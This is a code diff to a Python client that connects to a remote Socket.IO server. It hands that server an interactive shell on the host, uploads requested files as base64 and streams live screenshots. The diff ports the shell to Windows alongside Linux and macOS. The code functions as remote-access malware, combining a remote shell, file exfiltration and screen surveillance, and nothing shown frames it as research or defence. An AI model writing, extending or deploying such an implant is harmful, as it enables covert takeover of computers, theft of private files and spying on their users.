@@ -1,17 +1,16 @@
+import os
 import subprocess
 import threading
-import pty
 import platform
 import socketio
-import sys
-import base64
 import ssl
 from urllib.request import urlopen
-from PIL import Image
 import importlib.util
-import mss
-import time
+import base64
 import io
+import time
+from PIL import Image
+import mss
 
 # Declare the global stop event
 stop_event = threading.Event()
@@ -35,8 +34,6 @@ def run(data):
 
     system = platform.system()
 
-    global shell
-
     if system == "Linux" or system == "Darwin":
         shellScript = "bash"
     elif system == 'Windows':
@@ -47,41 +44,57 @@ def run(data):
     class InteractiveShell:
         def __init__(self):
             self.process = None
-            self.master_fd = None  # Master file descriptor for PTY
+            self.master_fd = None  # Master file descriptor for PTY on Unix systems
             self.running = False
 
         def start(self):
             self.running = True
-            # Create a pseudo-terminal pair
-            self.master_fd, slave_fd = pty.openpty()
+            if os.name == 'posix':  # Unix-like systems
+                import pty
+                self.master_fd, slave_fd = pty.openpty()
+                self.process = subprocess.Popen(
+                    [shellScript],
+                    stdin=slave_fd,
+                    stdout=slave_fd,
+                    stderr=slave_fd,
+                    universal_newlines=True,
+                    close_fds=True
+                )
+                output_thread = threading.Thread(target=self.read_output_posix)
+            else:  # Windows
+                self.process = subprocess.Popen(
+                    [shellScript],
+                    stdin=subprocess.PIPE,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    universal_newlines=True,
+                    shell=True
+                )
+                output_thread = threading.Thread(target=self.read_output_windows)
 
-            # Launch the bash process using the slave end of the PTY
-            self.process = subprocess.Popen(
-                [shellScript],
-                stdin=slave_fd,
-                stdout=slave_fd,
-                stderr=slave_fd,
-                universal_newlines=True,
-                close_fds=True
-            )
-
-            # Start a thread for handling output
-            output_thread = threading.Thread(target=self.read_output)
             output_thread.start()
 
-        def read_output(self):
+        def read_output_posix(self):
             while self.running:
                 try:
-                    # Read output directly from the PTY master file descriptor
                     output = os.read(self.master_fd, 1024).decode("utf-8")
                     if output:
-                        sio.emit("result", output)  #print(output, end="")
+                        sio.emit("result", output)
                 except OSError:
                     break
 
+        def read_output_windows(self):
+            while self.running:
+                output = self.process.stdout.readline()
+                if output:
+                    sio.emit("result", output)
+
         def write_input(self, command):
-            # Write input directly to the PTY master file descriptor
-            os.write(self.master_fd, command.encode() + b"\n")
+            if os.name == 'posix':
+                os.write(self.master_fd, command.encode() + b"\n")
+            else:
+                self.process.stdin.write(command + "\n")
+                self.process.stdin.flush()
 
     @sio.event
     def connect():
@@ -104,7 +117,7 @@ def run(data):
                 file = f.read()
             file_ready = base64.b64encode(file).decode('utf-8')
             sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
-            print("emited")
+            print("emitted")
 
     @sio.on("pem")
     def pem(data_new):
@@ -123,24 +136,17 @@ def run(data):
             while not stop_event.is_set():
                 current_time = time.time()
                 if current_time - last_capture_time >= frame_interval:
-                    # Capture screenshot
                     screenshot = sct.grab(monitor)
-                    
-                    # Convert screenshot to PIL Image
                     img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                     
-                    # Compress to JPEG with adjustable quality
                     with io.BytesIO() as output:
                         img.save(output, format="JPEG", quality=quality)
                         jpeg_data = output.getvalue()
                     
-                    # Emit the raw JPEG data instead of base64
                     sio.emit("screenshot", {"uid": uid, "image": jpeg_data})
                     print("Sent compressed screenshot")
-
                     last_capture_time = current_time
 
-                # Small sleep to prevent a tight loop
                 time.sleep(0.001)
 
     screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uuid']))
@@ -149,16 +155,15 @@ def run(data):
     def screen_status(data_new):
         if data['uuid'] == data_new['uid']:
             if data_new['status'] == "start":
-                stop_event.clear()  # Reset the event to False
+                stop_event.clear()
                 screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uuid']))
                 screenshot_thread.start()
             else:
-                stop_event.set()  # Signal the thread to stop
+                stop_event.set()
                 try:
-                    screenshot_thread.join()  # Wait for the thread to finish
+                    screenshot_thread.join()
                 except:
-                    "Thread is already dead"
-
+                    print("Thread is already dead")
 
     sio.connect(data['url'])
 
